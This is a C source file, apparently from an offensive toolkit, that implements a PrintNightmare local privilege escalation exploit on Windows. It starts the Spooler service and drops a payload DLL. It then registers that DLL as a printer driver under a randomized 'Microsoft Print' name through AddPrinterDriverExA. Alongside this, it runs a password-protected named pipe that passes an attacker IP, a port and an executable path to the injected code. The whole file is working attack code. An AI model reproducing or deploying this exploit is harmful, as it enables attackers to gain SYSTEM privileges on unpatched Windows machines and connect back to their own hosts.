#include <windows.h>
#include <stdio.h>

#include "Tools.h"
#include "DllHijacking.h"
#include "Message.h"
#include "PipeServer.h"
#include "MgService.h"

#define DRIVER_INFO_LEVEL_2		2
#define DRIVER_NAME_SIZE		30


VOID GenRandDriverNamePrint(char* drivername){
	const char prefix[] = "Microsoft Print ";

	strcpy_s(drivername, DRIVER_NAME_SIZE, prefix);
	GenRandDriverName(drivername + sizeof(prefix)-1, DRIVER_NAME_SIZE - sizeof(prefix));
	return;
}
VOID CreateDriverInfo(char* dllPath, DRIVER_INFO_2A* pInfo){
	// https://docs.microsoft.com/en-us/windows/win32/printdocs/driver-info-2
	char driverName[DRIVER_NAME_SIZE + 1];

	GenRandDriverNamePrint(driverName);
	pInfo->cVersion = 3;
	pInfo->pConfigFile = dllPath;
	pInfo->pDataFile = (char*)"C:\\Windows\\System32\\kernelbase.dll";
	pInfo->pDriverPath = NULL;
	pInfo->pEnvironment = NULL;
	pInfo->pName = driverName;
	printMsg(STATUS_INFO2, LEVEL_DEFAULT, "Driver name: '%s'\n", driverName);
	return;
}

BOOL EnumPrinter(LPBYTE* pInfo){
	DWORD pcbNeeded = 0;
	DWORD numDriversExist = 0;
	EnumPrinterDriversA(NULL, NULL, 2, NULL, 0, &pcbNeeded, &numDriversExist);
	printMsg(STATUS_INFO2, LEVEL_DEFAULT, "Drivers Count: %d\n", numDriversExist);

	*pInfo = (LPBYTE)malloc(pcbNeeded);
	if (*pInfo == NULL)
		return FALSE;

	//[Start find Printer Driver]
	if (!EnumPrinterDriversA(NULL, NULL, 2, *pInfo, pcbNeeded, &pcbNeeded, &numDriversExist)){
		if (GetLastError() == RPC_S_SERVER_UNAVAILABLE){
			printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Find Printer Driver ERR: service Spooler is not running");
		}else
			printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Find Printer Driver ERR");
		free(*pInfo);
		return FALSE;
	} else
		printMsg(STATUS_INFO2, LEVEL_DEFAULT, "Finding Printer Driver ok.\n");
	return TRUE;
}

BOOL PrintNightmareLPE(char* dllPath){
	DRIVER_INFO_2A info;
	LPBYTE pInfo = NULL;

	CreateDriverInfo(dllPath, &info);
	if (EnumPrinter(&pInfo)){
		DRIVER_INFO_6A* foundInfo = (DRIVER_INFO_6A*)pInfo;
		info.pDriverPath = foundInfo->pDriverPath;

		if (AddPrinterDriverExA(NULL, DRIVER_INFO_LEVEL_2, (PBYTE)&info, APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | 0x8000)){
			printMsg(STATUS_OK2, LEVEL_DEFAULT, "New printer driver added\n");
			printMsg(STATUS_OK2, LEVEL_DEFAULT, "Done !!! All finished.\n");
			free(pInfo);
			return TRUE;
		} else{
			DWORD lastError = GetLastError();
			switch (lastError){
			case ERROR_PRINTER_DRIVER_BLOCKED:
				printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Error with AddPrinterDriverEx: PRINTER DRIVER BLOCKED");
				break;
			case ERROR_PRINTER_DRIVER_WARNED:
				printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Error with AddPrinterDriverEx: PRINTER DRIVER WARNED");
				break;
			case RPC_E_ACCESS_DENIED:
				printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Error with AddPrinterDriverEx: RPC_E_REMOTE_DISABLED");
				break;
			case RPC_S_CALL_FAILED:
				// OK
				free(pInfo);
				return TRUE;
			default:
				printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Error with AddPrinterDriverEx");
				break;
			}
		}
		free(pInfo);
	}
	return FALSE;
}



DWORD WINAPI ThreadPipeServer(LPVOID lpvParam){
	const char* lpszPipename = "\\\\.\\pipe\\mynamedpipeLow";
	const char* password = "ekttKwf3PFzRCc9egZ5AKfd8FKvGjRu3DrHCTdwT5YKCk2dm9rSxByFzFNKb";
	PipeDataStruct* pPipeDataStruct =(PipeDataStruct*)lpvParam;

	if (SendInfoPipe(pPipeDataStruct, lpszPipename, password)){
		printMsg(STATUS_TITLE, LEVEL_DEFAULT, "Result:\n");
		if(pPipeDataStruct->exploitStatus)
			printMsg(STATUS_OK2, LEVEL_DEFAULT, "Status: %i\n", pPipeDataStruct->exploitStatus);
		else
			printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Status: %i\n", pPipeDataStruct->exploitStatus);
		return FALSE;
	}
	return -1;
}

BOOL ExploitPrintNightmareLPE(char* PathExeToRun, WCHAR* UipAddress, char* port, char* wincatDefaultDir){
	const char* dllName = "DriverPrinter.dll";
	const char* serviceName = "Spooler";

	if (CheckServerStatus((char*)serviceName) == SERVICE_NOT_RUNNING){
		if (StartServer((char*)serviceName) == SERVICE_ERROR)
			return FALSE;
	}


	/*if (!SaveRHostInfo(UipAddress, port)){
		printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to save info in reg (RHost)");
		return FALSE;
	}
	if (!SaveCPathInfo(PathExeToRun)){
		printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to save info in reg (Path)");
		return FALSE;
	}*/

	if (DropDllFile(wincatDefaultDir, (char*)dllName)){
		DWORD dwThreadId = 0;
		HANDLE hThread;

		PipeDataStruct pipeDataStruct = {
			.port = atoi(port),				// NOT OPTI !!!!
			.exploitStatus = FALSE,
			.pathExeToRun = PathExeToRun
		};
		sprintf_s(pipeDataStruct.ipAddress, IP_ADDRESS_SIZE, "%ws", UipAddress);

		hThread = CreateThread(NULL, 0, ThreadPipeServer, (LPVOID)&pipeDataStruct, 0, &dwThreadId);
		if (hThread != NULL){
			char* dllPath = (char*)malloc(MAX_PATH);
			if (dllPath != NULL){
				sprintf_s(dllPath, MAX_PATH, "%s\\%s", wincatDefaultDir, dllName);

				Sleep(1000);

				// CHeck if service 'Spooler' is running ??
				if (PrintNightmareLPE(dllPath)){
					DWORD timToWait = 60 * 1000;
					if (WaitForSingleObject(hThread, timToWait)  == WAIT_ABANDONED){
						TerminateThread(hThread, -1);
						CloseHandle(hThread);
					}
					free(dllPath);
					return TRUE;
				}
				free(dllPath);
			}
			CloseHandle(hThread);
		}else
			printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "CreateThread failed");
	}
	return FALSE;
}